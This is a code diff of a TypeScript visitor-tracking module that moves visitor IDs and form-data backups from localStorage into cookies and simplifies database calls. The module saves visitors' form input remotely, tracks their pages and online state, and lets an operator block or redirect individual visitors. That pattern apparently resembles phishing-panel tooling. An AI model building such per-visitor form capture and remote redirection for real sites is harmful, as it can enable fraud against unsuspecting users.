@@ -1,6 +1,7 @@
-import { db } from "./supabase-client";
+import { db, doc, setDoc, getDoc, safeJsonStringify, sanitizeForJson } from "./supabase-client";
 import { secureAddData as addData } from "./secure-supabase";
-import { doc, setDoc, getDoc, Firestore } from "./supabase-client";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 let _listenersInitialized = false;
 let _activityInterval: ReturnType<typeof setInterval> | null = null;
@@ -21,7 +22,7 @@ export function getOrCreateVisitorID(): string {
 
   // Read from either key for backward compatibility
   let visitorId =
-    localStorage.getItem("visitor") || localStorage.getItem("visitor_id");
+    getCookie("visitor") || getCookie("visitor_id");
 
   if (!visitorId) {
     // Use crypto.randomUUID when available for guaranteed uniqueness
@@ -32,8 +33,8 @@ export function getOrCreateVisitorID(): string {
   }
 
   // Always sync both keys so every page finds the same ID
-  localStorage.setItem("visitor", visitorId);
-  localStorage.setItem("visitor_id", visitorId);
+  setCookie("visitor", visitorId);
+  setCookie("visitor_id", visitorId);
 
   return visitorId;
 }
@@ -116,19 +117,20 @@ export async function getCountry(): Promise<string> {
 }
 
 function backupToLocalStorage(visitorId: string, data: Record<string, any>) {
-  if (typeof localStorage === "undefined") return;
+  if (typeof document === "undefined") return;
   try {
     const key = `__fb_backup_${visitorId}`;
-    const existing = JSON.parse(localStorage.getItem(key) || "{}");
-    const merged = { ...existing, ...data };
-    localStorage.setItem(key, JSON.stringify(merged));
+    const existing = JSON.parse(getCookie(key) || "{}");
+    const sanitizedData = sanitizeForJson(data) || {};
+    const merged = { ...existing, ...sanitizedData };
+    setCookie(key, safeJsonStringify(merged));
   } catch {}
 }
 
 async function safeWrite(visitorId: string, data: Record<string, any>) {
   if (!visitorId || !db) return;
   try {
-    const docRef = doc(db as Firestore, "pays", visitorId);
+    const docRef = doc("pays", visitorId);
     await setDoc(docRef, data, { merge: true });
   } catch (error) {
     console.error("[OnlineTracking] Error writing, backing up locally:", error);
@@ -161,7 +163,7 @@ async function flushWriteQueue() {
 export async function initializeVisitorTracking(visitorId: string) {
   if (db) {
     try {
-      const docRef = doc(db as Firestore, "pays", visitorId);
+      const docRef = doc("pays", visitorId);
       const docSnap = await getDoc(docRef);
       if (docSnap.exists()) {
         await setDoc(
@@ -246,7 +248,7 @@ function setupOnlineOfflineListeners(visitorId: string) {
     flushWriteQueue();
     if (navigator.sendBeacon && db) {
       try {
-        const payload = JSON.stringify({
+        const payload = safeJsonStringify({
           visitorId,
           isOnline: false,
           lastActiveAt: new Date().toISOString(),
@@ -312,7 +314,7 @@ export async function updateVisitorPage(
   if (!visitorId || !db) return;
 
   try {
-    const docRef = doc(db as Firestore, "pays", visitorId);
+    const docRef = doc("pays", visitorId);
     await setDoc(
       docRef,
       {
@@ -346,7 +348,7 @@ export async function saveFormData(
   backupToLocalStorage(visitorId, timestampedData);
 
   try {
-    const docRef = doc(db as Firestore, "pays", visitorId);
+    const docRef = doc("pays", visitorId);
     await setDoc(
       docRef,
       {
@@ -375,7 +377,7 @@ export async function saveFormData(
 export async function checkIfBlocked(visitorId: string): Promise<boolean> {
   if (!db) return false;
   try {
-    const docRef = doc(db as Firestore, "pays", visitorId);
+    const docRef = doc("pays", visitorId);
     const docSnap = await getDoc(docRef);
     if (docSnap.exists()) {
       return (docSnap.data() as any)?.isBlocked === true;
@@ -393,7 +395,7 @@ export async function checkRedirectPage(
 ): Promise<string | null> {
   if (!db) return null;
   try {
-    const docRef = doc(db as Firestore, "pays", visitorId);
+    const docRef = doc("pays", visitorId);
     const docSnap = await getDoc(docRef);
 
     if (docSnap.exists()) {
@@ -414,7 +416,7 @@ export async function clearRedirectPage(visitorId: string) {
   if (!visitorId || !db) return;
 
   try {
-    const docRef = doc(db as Firestore, "pays", visitorId);
+    const docRef = doc("pays", visitorId);
     await setDoc(
       docRef,
       {
@@ -432,7 +434,7 @@ export async function setRedirectPage(visitorId: string, targetPage: string) {
   if (!visitorId || !db) return;
 
   try {
-    const docRef = doc(db as Firestore, "pays", visitorId);
+    const docRef = doc("pays", visitorId);
     await setDoc(
       docRef,
       {
